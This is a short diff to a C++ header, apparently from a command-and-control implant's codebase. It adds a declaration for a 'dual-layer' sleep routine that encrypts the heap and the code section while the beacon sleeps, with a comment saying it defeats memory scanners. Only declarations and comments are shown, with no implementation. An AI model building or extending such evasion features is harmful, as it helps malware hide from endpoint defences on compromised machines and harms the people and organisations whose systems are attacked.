@@ -34,6 +34,11 @@ namespace HeapEncrypt {
     // Combined: heap-encrypt, sleep for `ms` ms, heap-decrypt.
     // Also accepts jitter (added to ms randomly).
     void EncryptedSleep(DWORD ms, DWORD jitter = 0);
+
+    // Full dual-layer sleep: encrypt heap + encrypt .text via SleepObfusc,
+    // sleep, then decrypt both. Defeats heap and code-section memory scanners
+    // simultaneously. Use this in the main beacon loop instead of EncryptedSleep.
+    void CombinedObfSleep(DWORD ms, DWORD jitter = 0);
 }
 
 #endif
